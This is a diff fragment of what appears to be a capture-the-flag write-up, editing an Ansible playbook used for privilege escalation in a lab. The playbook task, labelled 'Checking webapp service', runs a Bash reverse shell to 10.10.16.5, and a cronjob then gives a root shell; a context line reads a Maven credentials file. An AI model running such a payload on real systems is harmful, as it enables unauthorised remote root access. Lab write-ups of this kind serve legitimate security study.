@@ -83,9 +83,10 @@ cat /home/frank/.m2/settings.xml
 - The shell command is a Bash reverse shell payload that will attempt to connect back to our machine
 ```
 - hosts: localhost
- tasks:
- - name: Checking webapp service
- shell: bash -c 'bash -i >& /dev/tcp/10.10.16.5/1258 0>&1'
+  tasks:
+  - name: Checking webapp service
+    shell:
+      cmd: bash -c 'bash -i >& /dev/tcp/10.10.16.5/1233 0>&1'
 ```
 - After two minutes, when the cronjob executes, we successfully get a reverse shell as root
 - 
